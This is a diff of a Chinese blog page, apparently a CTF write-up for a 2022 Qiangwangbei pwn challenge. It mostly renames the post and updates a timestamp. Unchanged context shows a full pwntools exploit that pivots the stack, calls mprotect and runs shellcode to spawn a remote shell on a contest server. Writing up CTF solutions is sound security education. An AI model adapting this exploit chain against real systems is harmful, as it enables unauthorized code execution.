@@ -18,14 +18,14 @@
   
     <meta name="description" content="寄寄寄寄，摆摆摆摆摆">
 <meta property="og:type" content="article">
-<meta property="og:title" content="2022 强网杯初赛 Pwn 部分题解及赛后复现">
+<meta property="og:title" content="2022 强网杯初赛 Pwn 部分题解">
 <meta property="og:url" content="http://n1ghtu.github.io/posts/cfd0f35d.html">
 <meta property="og:site_name" content="Nightu">
 <meta property="og:description" content="寄寄寄寄，摆摆摆摆摆">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/image-20220803012727676.png">
 <meta property="article:published_time" content="2022-08-02T17:21:36.000Z">
-<meta property="article:modified_time" content="2022-09-27T01:42:37.661Z">
+<meta property="article:modified_time" content="2022-10-25T03:16:54.169Z">
 <meta property="article:author" content="Nightu">
 <meta property="article:tag" content="Nightu CTF pwn">
 <meta name="twitter:card" content="summary_large_image">
@@ -33,7 +33,7 @@
   
   
   
-  <title>2022 强网杯初赛 Pwn 部分题解及赛后复现 - Nightu</title>
+  <title>2022 强网杯初赛 Pwn 部分题解 - Nightu</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -186,7 +186,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="2022 强网杯初赛 Pwn 部分题解及赛后复现"></span>
+            <span id="subtitle" data-typed-text="2022 强网杯初赛 Pwn 部分题解"></span>
           
         </div>
 
@@ -258,7 +258,7 @@
         <div id="board">
           <article class="post-content mx-auto">
             <!-- SEO header -->
-            <h1 style="display: none">2022 强网杯初赛 Pwn 部分题解及赛后复现</h1>
+            <h1 style="display: none">2022 强网杯初赛 Pwn 部分题解</h1>
             
             
               <div class="markdown-body">
@@ -308,7 +308,7 @@
 <p>读入第一段 shellcode 扩大输入字节数，然后直接调 <a target="_blank" rel="noopener" href="http://shellcraft.sh">shellcraft.sh</a>() 即可，注意的是输出流被关闭了，执行 <code>exec 1&gt;&amp;0</code> 恢复就行。</p>
 <h4 id="Exp-v2"><a class="header-anchor" href="#Exp-v2">¶</a>Exp</h4>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python2</span><br><span class="hljs-comment"># -*- coding: utf-8 -*</span><br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>se      = <span class="hljs-keyword">lambda</span> data               :p.send(data) <br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :p.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :p.recv(numb)<br>ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :p.recvuntil(delims, drop)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>lg = <span class="hljs-keyword">lambda</span> name,data : p.success(name + <span class="hljs-string">&#x27;: \033[1;36m 0x%x \033[0m&#x27;</span> % data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params"><span class="hljs-built_in">breakpoint</span>=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>    glibc_dir = <span class="hljs-string">&#x27;~/pwn/source/glibc-2.35/&#x27;</span><br>    gdbscript = <span class="hljs-string">&#x27;directory %smalloc/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %sstdio-common/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %sstdlib/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %slibio/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %self/\n&#x27;</span> % glibc_dir<br>    elf_base = <span class="hljs-built_in">int</span>(os.popen(<span class="hljs-string">&#x27;pmap &#123;&#125;| awk \x27&#123;&#123;print \x241&#125;&#125;\x27&#x27;</span>.<span class="hljs-built_in">format</span>(p.pid)).readlines()[<span class="hljs-number">1</span>], <span class="hljs-number">16</span>) <span class="hljs-keyword">if</span> elf.pie <span class="hljs-keyword">else</span> <span class="hljs-number">0</span><br>    gdbscript += <span class="hljs-string">&#x27;b *&#123;:#x&#125;\n&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">int</span>(<span class="hljs-built_in">breakpoint</span>) + elf_base) <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(<span class="hljs-built_in">breakpoint</span>, <span class="hljs-built_in">int</span>) <span class="hljs-keyword">else</span> <span class="hljs-built_in">breakpoint</span><br>    gdbscript += <span class="hljs-string">&#x27;b fprintf&#x27;</span><br>    gdb.attach(p, gdbscript)<br>    time.sleep(<span class="hljs-number">1</span>)<br><br>elf = ELF(<span class="hljs-string">&#x27;./devnull&#x27;</span>)<br>context(arch = elf.arch, os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>,terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>, <span class="hljs-string">&#x27;splitw&#x27;</span>, <span class="hljs-string">&#x27;-hp&#x27;</span>,<span class="hljs-string">&#x27;62&#x27;</span>])<br><span class="hljs-comment"># p = process(&#x27;./devnull&#x27;)</span><br><span class="hljs-comment"># debug(0x4014E3)</span><br>p = remote(<span class="hljs-string">&#x27;47.94.166.51&#x27;</span>,<span class="hljs-number">33797</span>)<br>addr = <span class="hljs-number">0x3fe000</span> + <span class="hljs-number">0x500</span><br>leave_ret = <span class="hljs-number">0x401511</span><br>rax_leave_ret = <span class="hljs-number">0x401350</span> <span class="hljs-comment"># mov rax, [rbp+s];leave;ret;</span><br>len_rax_mprotect = <span class="hljs-number">0x4012D0</span> <span class="hljs-comment"># len = 0x1000 addr = rax mprotect</span><br><span class="hljs-comment"># sea(&quot;please input your filename\n&quot;,&#x27;/bin/sh\0&#x27;.ljust(0x20,&#x27;\0&#x27;)+&#x27;\x00&#x27;+&#x27;\0&#x27;*0x13+p64(0x404010))</span><br>sea(<span class="hljs-string">&quot;please input your filename\n&quot;</span>,<span class="hljs-string">&#x27;/bin/sh\0&#x27;</span>.ljust(<span class="hljs-number">0x20</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)+<span class="hljs-string">&#x27;\0&#x27;</span>*(<span class="hljs-number">0x1c</span>-<span class="hljs-number">8</span>)+p64(addr)+p64(addr+<span class="hljs-number">0x18</span>)+p64(rax_leave_ret))<br>shellcode = asm(<br>  <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">  push 0</span><br><span class="hljs-string">  pop rax</span><br><span class="hljs-string">  xchg rdi,rsi</span><br><span class="hljs-string">  xchg rdi,rdx</span><br><span class="hljs-string">  push 0</span><br><span class="hljs-string">  pop rdi</span><br><span class="hljs-string">  syscall</span><br><span class="hljs-string">  &#x27;&#x27;&#x27;</span><br>)<br>payload = p64(<span class="hljs-number">0x3fe000</span>) <span class="hljs-comment"># rax</span><br>payload = payload.ljust(<span class="hljs-number">0x20</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)<br>payload += p64(len_rax_mprotect) + p64(<span class="hljs-number">0</span>) + p64(addr+<span class="hljs-number">0x38</span>) + shellcode<br>sea(<span class="hljs-string">&quot;please input your new data\n&quot;</span>,payload)<br><br>sleep(<span class="hljs-number">2</span>)<br><span class="hljs-comment"># sl(&#x27;\0&#x27;*0x546+asm(shellcraft.cat(&#x27;./flag&#x27;,fd=2)))</span><br><span class="hljs-comment"># sl(&#x27;\0&#x27;*0x546+asm(shellcraft.write(2,&#x27;rsp&#x27;,&#x27;0x50&#x27;)))</span><br>sl(<span class="hljs-string">&#x27;\0&#x27;</span>*<span class="hljs-number">0x546</span>+asm(shellcraft.sh()))<br>sleep(<span class="hljs-number">2</span>)<br>sl(<span class="hljs-string">&#x27;exec 1&gt;&amp;0&#x27;</span>)<br>sleep(<span class="hljs-number">2</span>)<br>sl(<span class="hljs-string">&#x27;cat flag&#x27;</span>)<br>p.interactive()<br><br><br></code></pre></td></tr></table></figure>
-<p>什么，你说复现哪去了？在学了在学了。（悲</p>
+<p>什么，你说复现哪去了？在学了在学了。（润</p>
 
                 
               </div>
@@ -326,7 +326,7 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>2022 强网杯初赛 Pwn 部分题解及赛后复现</div>
+      <div>2022 强网杯初赛 Pwn 部分题解</div>
       <div>http://n1ghtu.github.io/posts/cfd0f35d.html</div>
     </div>
     <div class="license-meta">
